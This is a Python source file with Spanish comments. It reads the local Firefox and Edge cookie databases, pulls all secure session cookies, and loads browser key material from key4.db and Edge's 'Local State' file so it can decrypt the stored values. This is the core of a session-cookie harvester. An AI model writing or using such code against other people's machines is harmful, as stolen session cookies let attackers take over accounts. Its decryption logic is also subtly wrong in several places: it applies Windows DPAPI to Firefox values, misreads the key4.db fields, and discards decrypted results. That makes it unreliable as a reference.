import base64
import json
import os
import sqlite3
import binascii

import pywintypes
import win32crypt
from models.cookie import FirefoxCookie, EdgeCookie
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend



class CookieRepository_Firefox:
    def __init__(self):
        self.firefox_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "3xl97urt.default-release", "cookies.sqlite")
        self.firefox_key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "3xl97urt.default-release", "key4.db")

    # Obtner las cookies de firefox
    def get_firefox_cookies(self):
        cookies = []
        with sqlite3.connect(self.firefox_db_path) as conn:
            cursor = conn.cursor()
            # Obtener todas las cookies de la base de datos
            cursor.execute(
                'SELECT originAttributes, host, name, value, path, expiry, lastAccessed, isHttpOnly, isSecure FROM moz_cookies')

            # Iterar sobre todas las cookies
            for originAttributes, host, name, value, path, expiry, lastAccessed, isHttpOnly, isSecure in cursor.fetchall():
                # Intentar desencriptar el valor de la cookie
                try:
                    decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode('utf-8')
                    path_value = win32crypt.CryptUnprotectData(path, None, None, None, 0)[1].decode('utf-8')
                except Exception:
                    # Si la desencriptación falla, usar el valor original
                    decrypted_value = value
                    path_value = path

                # Agregar la cookie a la lista de cookies
                cookies.append(
                    FirefoxCookie(originAttributes, host, name, decrypted_value, path_value, expiry, lastAccessed, isHttpOnly,
                                  isSecure))

        return cookies

    # Obtner las cookies de session de firefox
    def get_firefox_cookies_session(self):
        session_cookies = []
        rep = CookieRepository_Firefox()
        with sqlite3.connect(self.firefox_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT originAttributes, name, value, path, host, expiry, lastAccessed, isHttpOnly, isSecure FROM moz_cookies WHERE isSecure = 1 ORDER BY expiry DESC')

            for originAttributes, name, value, path, host, expiry, lastAccessed, isHttpOnly, isSecure in cursor.fetchall():
                try:
                    #desencriptar el valor de la cookie win32crypt
                    decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode('utf-8')
                    path_value = win32crypt.CryptUnprotectData(path, None, None, None, 0)[1].decode('utf-8')
                except Exception:
                    decrypted_value = value
                    path_value = path
                session_cookies.append(
                    FirefoxCookie(originAttributes, host, name, value, path, expiry, lastAccessed, isHttpOnly,
                                  isSecure))

        return session_cookies

    # Count the session cookies of firefox
    def count_firefox_cookies_session(self):
        with sqlite3.connect(self.firefox_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT COUNT(*) FROM moz_cookies WHERE isSecure = 1')
            row = cursor.fetchone()
        return row[0] if row else 0

    def decrypt_firefox(self, encrypted_value):
        try:
            encryption_key, IV = self.get_encryption_key_and_iv()
            if encryption_key and IV:
                ciphertext = binascii.unhexlify(encrypted_value)
                cipher = Cipher(algorithms.TripleDES(encryption_key), modes.CBC(IV), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted_value = decryptor.update(ciphertext) + decryptor.finalize()
                decrypted_value = base64.b64encode(decrypted_value).decode('utf-8')
                return decrypted_value
        except Exception:
            return None

    # Desencriptar cookies de firefox
    def get_encryption_key_and_iv(self):
        conn = sqlite3.connect(self.firefox_key_path)
        cursor = conn.cursor()
        cursor.execute('SELECT item1, item2 FROM metaData WHERE id = ? ', ('password',))
        row = cursor.fetchone()
        if row:
            encryption_key_hex = row[0].strip("'")
            IV_hex = row[1].strip("'")
            encryption_key = binascii.unhexlify(encryption_key_hex)
            IV = binascii.unhexlify(IV_hex)
            return encryption_key, IV
        return None, None


class CookieRepository_Edge:
    def __init__(self):
        self.edge_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Microsoft", "Edge", "User Data", "Default",'Network', "Cookies")
        self.directorio_llaves_edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                              "Microsoft", "Edge", "User Data", "Local State")
    # Obtner las cookies de session de edge
    def get_edge_cookies(self):
        cookies = []
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies')
            for row in cursor.fetchall():
                cookies.append(EdgeCookie(*row))
        return cookies

    # Obtner las cookies de session de edge
    def get_edge_cookies_session(self):
        session_cookies = []
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies WHERE is_secure = 1')
            for row in cursor.fetchall():
                session_cookies.append(EdgeCookie(*row))
        return session_cookies

    # Contar las cookies de session de edge
    def count_edge_cookies_session(self):
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT COUNT(*) FROM cookies WHERE is_secure = 1')
            row = cursor.fetchone()
        return row[0] if row else 0

    def obtener_llave_session(self):
        # Leer el archivo key
        with open(self.directorio_llaves_edge, 'r') as file:
            key = file.read()  # Leer el archivo
            # Guardar en json el archivo
            key = json.loads(key)

        return key

